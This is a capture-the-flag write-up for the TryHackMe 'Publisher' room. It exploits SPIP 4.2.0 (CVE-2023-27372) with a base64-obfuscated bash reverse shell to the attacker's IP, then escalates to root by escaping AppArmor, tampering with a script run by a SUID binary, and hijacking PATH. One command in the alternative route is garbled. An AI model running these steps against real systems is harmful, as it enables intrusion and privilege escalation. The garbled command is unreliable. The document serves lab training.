---
title: Publisher
description: 'Exploiting SPIP 4.2.0 (CVE-2023-27372) and privilege escalation through Docker'
pubDate: 2024-08-02
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718377893997'
---

On the SPIP login page (http://10.10.33.114/spip/spip.php?page=login&url=spip.php&lang=fr) in the source we find the version number

```html
...[snip]...
<meta name="generator" content="SPIP 4.2.0" />
...[snip]...
```

Searching exploit-db for this version we find an unauth RCE:
https://www.exploit-db.com/exploits/51536

For some reason this exploit didn't work when I copy/pasted it from there but searching for the CVE gives us this Github page: https://github.com/nuts7/CVE-2023-27372

## USER

Getting a shell on the box:
```bash
git clone https://github.com/nuts7/CVE-2023-27372
cd CVE-2023-27372/
./CVE-2023-27372.py -u http://10.10.33.114/spip -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjExOS4xMzcvNDQ0NCAwPiYx|base64 -d|bash' -v
```
Now we can read the user flag and get the `id_rsa` of the user `think`.


## ROOT

First we login through SSH to get a proper shell:

```bash
ssh -i think_id_rsa think@10.10.33.114
```

It's kind of strange we can't create files in our own home directory or in the `/tmp` directory. It looks like the permissions are strangely setup.

Searching for SUID capabilities we find an interesting file:
```bash
find / -perm -u=s -type f 2>/dev/null
...[snip]...
/usr/sbin/run_container
```

If we run it we get an error in an other file:
```bash
think@publisher:/dev/shm$ /usr/sbin/run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up About an hour

Enter the ID of the container or leave blank to create a new one: 41c976e507f8
/opt/run_container.sh: line 16: validate_container_id: command not found
...[snip]...
```

If we could modify the `/opt/run_container.sh` we could get a root shell, but we don't have the permissions.

The hint here tells us to look at `App Armor`.

```bash
think@publisher:/etc/apparmor.d$ ls -al
total 84
drwxr-xr-x   8 root root  4096 Feb 12 20:19 .
drwxr-xr-x 130 root root 12288 Feb 12 21:20 ..
...[snip]...
-rw-r--r--   1 root root   532 Feb 12 20:18 usr.sbin.ash
...[snip]...
```

It looks like there is no profile for `bash`, only for `ash`.
Checking our ENV we see that we are in fact running `ash`

```bash
think@publisher:/etc/apparmor.d$ env
SHELL=/usr/sbin/ash
PWD=/etc/apparmor.d
LOGNAME=think
...[snip]...
```

Checking the profile for `ash` shows us that we don't have much permissions to even write files:
```bash
cat usr.sbin.ash
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```

We can however write files in `/dev/shm` because its missing the wildcards (`**`) at the end.

If we can break out of the `ash` shell and get a regular `bash` shell we can modify a lot more files

```bash
cd /dev/shm
cp /bin/bash .
echo $0
-ash
./bash -p
echo $0
./bash
```

Since we have a `bash` shell now we can list files in `/opt`.
```bash
ls -al /opt/
total 20
drwxr-xr-x  3 root root 4096 Jan 10  2024 .
drwxr-xr-x 18 root root 4096 Nov 14  2023 ..
drwx--x--x  4 root root 4096 Nov 14  2023 containerd
-rw-r--r--  1 root root  861 Dec  7  2023 dockerfile
-rwxrwxrwx  1 root root 1715 Jan 10  2024 run_container.sh
```

We are even able to modify the `/opt/run_container.sh` file directly to add a `bash -p`.

```bash
#!/bin/bash
bash -p
...[snip]...
```

Once we modified the `/opt/run_container.sh` file we can execute the SUID binary to get a root shell:
```bash
/usr/sbin/run_container
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
```

### ALTERNATIVE ROUTE

Looking at the `/opt/run_container.sh` file we see that `docker` is not getting called with an absolute path.

```bash
cd /dev/shm
echo docker > '/bin/bash -p'
chmod +x docker
export "PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"

$PATH
-ash: /dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
```

Now we run the `/opt/run_container.sh` script to get our poisoned docker file executed.

```bash
hink@publisher:/dev/shm$ /opt/run_container.sh
think@publisher:/dev/shm$ $PATH
bash: /dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin: No such file or directory
```

We see we get a `bash` path now.

```bash
cp docker /opt/run_container.sh
/usr/sbin/run_container
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
```
